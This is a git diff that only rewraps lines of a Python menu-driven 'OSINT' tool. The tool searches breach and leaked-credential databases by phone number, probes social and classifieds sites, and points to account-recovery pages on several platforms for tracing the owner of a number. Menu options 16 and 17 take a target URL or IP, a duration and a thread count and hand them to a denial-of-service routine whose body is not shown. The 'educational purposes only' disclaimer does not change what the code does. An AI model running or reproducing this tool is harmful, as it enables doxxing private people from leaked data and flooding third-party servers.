-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Mobile number: {phone}")
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Country: {country}")
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Carrier: {region}")
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Timezone: {', '.join(time_zones)}")
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Number Type: {number_type}")
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Possible Number: {possible_number}")
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Valid Number: {valid_number}")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Mobile number: {phone}")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Country: {country}")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Carrier: {region}")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Timezone: {', '.join(time_zones)}")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Number Type: {number_type}")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Possible Number: {possible_number}")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Valid Number: {valid_number}")
         if valid_number:
             region_code = phonenumbers.region_code_for_number(parsed_number)
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Region Code: {region_code}")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Region Code: {region_code}")
         else:
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} The number is not valid.")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} The number is not valid.")
     except Exception as e:
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} [!] - Error fetching data: {e} - [!]")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} [!] - Error fetching data: {e} - [!]")
     try:
-        response = requests.get(f"https://api.proxynova.com/comb?query={phone[-11:]}&start=0&limit=100",allow_redirects=False)
+        response = requests.get(
+            f"https://api.proxynova.com/comb?query={phone[-11:]}&start=0&limit=100", allow_redirects=False)
         response.raise_for_status()
         lines = response.json().get("lines", [])
         for line in lines:
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Result: {line}")
-    except requests.RequestException:print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error fetching data from ProxyNova.")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Result: {line}")
+    except requests.RequestException:
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error fetching data from ProxyNova.")
     try:
-        response = requests.get(f"https://api.usersbox.ru/v1/explain",headers={'Authorization': f'Bearer {USERSBOX_API_KEY}'}, params={'q': phone})
+        response = requests.get("https://api.usersbox.ru/v1/explain", headers={
+                                'Authorization': f'Bearer {USERSBOX_API_KEY}'}, params={'q': phone})
         response.raise_for_status()
         items = response.json().get('data', {}).get('items', [])
         for item in items:
             database = item['source']['database']
             collection = item['source']['collection']
             hits_count = item['hits']['count']
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} UserBox DB: {database}, Collection: {collection}, Found: {hits_count}")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} UserBox DB: {database}, Collection: {collection}, Found: {hits_count}")
     except requests.RequestException:
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error fetching data from UserBox.")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error fetching data from UserBox.")
 
     def search_vk_by_phone(phone):
         response = requests.get(f"https://find.vk.com/phone/{phone}")
         if response.status_code == 200:
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} VK found!")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} VK found!")
             return response
         else:
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} VK not found")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} VK not found")
 
     result = search_vk_by_phone(phone)
     if result is not None:
         print(result)
     else:
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} User with this phone number not found in VK.")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} User with this phone number not found in VK.")
 
     url = f'https://www.avito.ru/rossiya/telefony?q={phone}'
     response = requests.head(url)
     if response.status_code == 200:
-        print(f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Avito found')
+        print(
+            f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Avito found')
     else:
-        print(f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Avito not found')
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}[1{Color.DARK_RED}] TG: t.me/{phone}")
+        print(
+            f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Avito not found')
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}[1{Color.DARK_RED}] TG: t.me/{phone}")
     print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}[2{Color.DARK_RED}] https://api.whatsapp.com/send/?phone={phone}&text&type=phone_number&app_absent=0 - Whatsapp")
     print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}[3{Color.DARK_RED}] https://transitapp.com/redirect.html?url=viber://chat?number={phone} - VIBER")
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}[4{Color.DARK_RED}] https://www.phoneradar.ru/phone/{phone} - Rating")
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}[4{Color.DARK_RED}] https://www.phoneradar.ru/phone/{phone} - Rating")
     print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}[5{Color.DARK_RED}] https://ok.ru/dk?st.cmd=anonymRecoveryStartPhoneLink - OK account search")
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}[6{Color.DARK_RED}] https://www.phoneradar.ru/phone/{phone}")
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}[6{Color.DARK_RED}] https://www.phoneradar.ru/phone/{phone}")
     print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}[7{Color.DARK_RED}] https://twitter.com/account/begin_password_reset - Twitter account search")
     print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}[8{Color.DARK_RED}] https://facebook.com/login/identify/?ctx=recover&ars=royal_blue_bar - Facebook account search")
-    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}[9{Color.DARK_RED}] skype:{phone}?call - Call number with Skype")
+    print(
+        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}[9{Color.DARK_RED}] skype:{phone}?call - Call number with Skype")
 
     def google_search_phone(phone):
         query = f"https://www.google.com/search?q={phone}"
@@ -1383,37 +1567,45 @@ def search_by_number():
                     link = href.replace('/url?q=', '').split('&')[0]
                     links.append(link)
             if len(links) > 0:
-                print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Links found:")
+                print(
+                    f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Links found:")
                 for link in links:
                     print(link)
             else:
-                print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Links not found")
+                print(
+                    f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Links not found")
         else:
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error during request")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error during request")
     google_search_phone(phone)
 
 
 def temp_mail():
     def create_temp_mail():
-        local_part = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter name: {Color.DARK_RED}")
+        local_part = input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter name: {Color.DARK_RED}")
         domain = "rteet.com"
         email = f"{local_part}@{domain}"
         return email
 
     def get_mailbox_messages(login, domain):
-        response = requests.get(f'https://www.1secmail.com/api/v1/?action=getMessages&login={login}&domain={domain}')
+        response = requests.get(
+            f'https://www.1secmail.com/api/v1/?action=getMessages&login={login}&domain={domain}')
         if response.status_code == 200:
             return response.json()
         else:
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Failed to retrieve messages.")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Failed to retrieve messages.")
             return []
 
     def get_message_details(login, domain, message_id):
-        response = requests.get(f'https://www.1secmail.com/api/v1/?action=readMessage&login={login}&domain={domain}&id={message_id}')
+        response = requests.get(
+            f'https://www.1secmail.com/api/v1/?action=readMessage&login={login}&domain={domain}&id={message_id}')
         if response.status_code == 200:
             return response.json()
         else:
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Failed to retrieve message details.")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Failed to retrieve message details.")
             return None
 
     def extract_text_from_html(html_content):
@@ -1422,10 +1614,14 @@ def temp_mail():
 
     def save_message_to_file(filename, sender, date, subject, body):
         with open(filename, 'a', encoding='utf-8') as file:
-            file.write(f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}From: {sender}\n')
-            file.write(f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Date: {date}\n')
-            file.write(f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Subject: {subject}\n')
-            file.write(f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Message: {body}\n\n')
+            file.write(
+                f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}From: {sender}\n')
+            file.write(
+                f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Date: {date}\n')
+            file.write(
+                f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Subject: {subject}\n')
+            file.write(
+                f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Message: {body}\n\n')
 
     def adjust_time(date_str):
         date_obj = datetime.strptime(date_str, "%Y-%m-%d %H:%M:%S")
@@ -1434,33 +1630,43 @@ def temp_mail():
 
     email = create_temp_mail()
     if email:
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Temporary email used: {Color.DARK_RED}{email}{Color.RESET}")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Temporary email used: {Color.DARK_RED}{email}{Color.RESET}")
 
         login, domain = email.split('@')
         processed_messages = set()
 
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Checking for new messages...")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Checking for new messages...")
         while True:
             messages = get_mailbox_messages(login, domain)
             if messages:
                 for message in messages:
                     if message['id'] not in processed_messages:
-                        message_details = get_message_details(login, domain, message['id'])
+                        message_details = get_message_details(
+                            login, domain, message['id'])
                         if message_details:
                             sender = message_details["from"]
                             date = adjust_time(message_details["date"])
                             subject = message_details["subject"]
-                            message_body = extract_text_from_html(message_details["body"])
-                            save_message_to_file('emails.txt', sender, date, subject, message_body)
+                            message_body = extract_text_from_html(
+                                message_details["body"])
+                            save_message_to_file(
+                                'emails.txt', sender, date, subject, message_body)
 
                             print()
-                            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} From: {Color.DARK_RED}{sender}{Color.RESET}")
-                            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Date: {Color.DARK_RED}{date}{Color.RESET}")
-                            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Subject: {Color.DARK_RED}{subject}{Color.RESET}")
-                            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Message: {Color.DARK_RED}{message_body}\n{Color.RESET}")
+                            print(
+                                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} From: {Color.DARK_RED}{sender}{Color.RESET}")
+                            print(
+                                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Date: {Color.DARK_RED}{date}{Color.RESET}")
+                            print(
+                                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Subject: {Color.DARK_RED}{subject}{Color.RESET}")
+                            print(
+                                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Message: {Color.DARK_RED}{message_body}\n{Color.RESET}")
 
                         processed_messages.add(message['id'])
             time.sleep(5)
+
 
 def check_email_address(email):
     pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
@@ -1470,8 +1676,10 @@ def check_email_address(email):
     else:
         return f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Invalid email address{Color.RESET}"
 
+
 def get_ip():
-    ip = input(f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Enter IP: ')
+    ip = input(
+        f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Enter IP: ')
 
     try:
         ip = socket.gethostbyname(ip)
@@ -1502,7 +1710,10 @@ def get_ip():
 
 ''')
     except Exception as e:
-        print(f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}An error occurred: {e}')
+        print(
+            f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}An error occurred: {e}')
+
+
 banner2 = f"""{gradient_text(banner_text, current_color_scheme)}                      
 
                             {Color.DARK_GRAY}Telegram: {Color.DARK_RED}@asoruperehod
@@ -1561,29 +1772,37 @@ while True:
         break
     elif select == '1':
         search_by_number()
-        input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
+        input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
     elif select == '3':
-        email = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Enter email address: ")
+        email = input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Enter email address: ")
         print(check_email_address(email))
-        input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
+        input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
     elif select == '2':
         get_ip()
-        input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
+        input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
     elif select == '4':
         print(f"""{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}The author is not responsible for users. The software was created for educational purposes only. All sources are public and the author has no relation to them.
 COLOR - Changing the software theme
 """)
         print("Thank you for choosing us!")
-        input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
+        input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
     elif select == '5':
         print(f"""{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}I would be grateful if you could donate for some dumplings <3
         @send (telegram bot):t.me/send?start=IV1xARFXeILV
         """)
-        input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
+        input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
     elif select == '6':
-        domain = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter the website domain: {Color.RESET}")
+        domain = input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter the website domain: {Color.RESET}")
         get_website_info(domain)
-        input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
+        input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
 
     elif select == '8':
         def transform_text(input_text):
@@ -1603,12 +1822,12 @@ COLOR - Changing the software theme
                     transformed_text.append(char)
             return "".join(transformed_text)
 
-
         input_text = input(f"{Color.DARK_RED}Enter text: {Color.DARK_RED}")
         transformed_text = transform_text(input_text)
         print(
             f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Result: {transformed_text}{Color.RESET}")
-        input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Press Enter.....{Color.RESET}")
+        input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Press Enter.....{Color.RESET}")
 
     if select == '9':
         def get_characters(complexity):
@@ -1621,21 +1840,30 @@ COLOR - Changing the software theme
 
         def generate_password(length, complexity):
             characters = get_characters(complexity)
-            password = "".join(random.choice(characters) for i in range(length))
+            password = "".join(random.choice(characters)
+                               for i in range(length))
             return password
 
-        password_length = int(input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Enter password length -> "))
-        complexity = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Choose complexity (low, medium, high): ")
+        password_length = int(input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Enter password length -> "))
+        complexity = input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Choose complexity (low, medium, high): ")
         print()
         complex_password = generate_password(password_length, complexity)
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Password: {complex_password}")
-        input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Password: {complex_password}")
+        input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
 
     if select == '10':
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Choose mode: ")
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}1 - Check commonly used ports")
-        print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}2 - Check specific port")
-        mode = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Your choice: ")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Choose mode: ")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}1 - Check commonly used ports")
+        print(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}2 - Check specific port")
+        mode = input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Your choice: ")
         if mode == '1':
             print()
             ports = [
@@ -1645,43 +1873,56 @@ COLOR - Changing the software theme
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 result = sock.connect_ex(("127.0.0.1", port))
                 if result == 0:
-                    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Port {port} is open")
+                    print(
+                        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Port {port} is open")
                 else:
-                    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Port {port} is closed")
+                    print(
+                        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Port {port} is closed")
                 sock.close()
                 print()
         elif mode == '2':
-            port = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Enter port number: ")
+            port = input(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Enter port number: ")
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             result = sock.connect_ex(("127.0.0.1", int(port)))
             print()
             if result == 0:
-                print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Port {port} is open")
+                print(
+                    f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Port {port} is open")
             else:
-                print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Port {port} is closed")
+                print(
+                    f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Port {port} is closed")
             sock.close()
             print()
         else:
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Unknown mode")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Unknown mode")
             print()
-            input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
+            input(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
     elif select == '11':
         temp_mail()
     elif select == '12':
         gmail_osint()
-        input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
+        input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
     elif select == '13':
         search_database()
-        input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
+        input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Press Enter.....")
     elif select == '14':
         proxies = get_proxy()
         if proxies:
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Proxy list:")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Proxy list:")
             for proxy in proxies:
-                print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} {proxy}")
+                print(
+                    f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} {proxy}")
         else:
-            print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} No proxy list available.")
-        input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
+            print(
+                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} No proxy list available.")
+        input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
     elif select == '15':
         check_site()
     elif select == '16':
@@ -1692,34 +1933,53 @@ COLOR - Changing the software theme
         threads = int(input(
             f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter number of threads: {Color.RESET}"))
         dos_attack(link, duration, threads)
-        input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
+        input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Press Enter...")
     elif select == '17':
-        ip_address = input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter the IP address: {Color.RESET}")
-        duration = int(input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter duration in minutes: {Color.RESET}"))
-        threads = int(input(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter number of threads: {Color.RESET}"))
+        ip_address = input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter the IP address: {Color.RESET}")
+        duration = int(input(
+            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter duration in minutes: {Color.RESET}"))
+        threads = int(input(
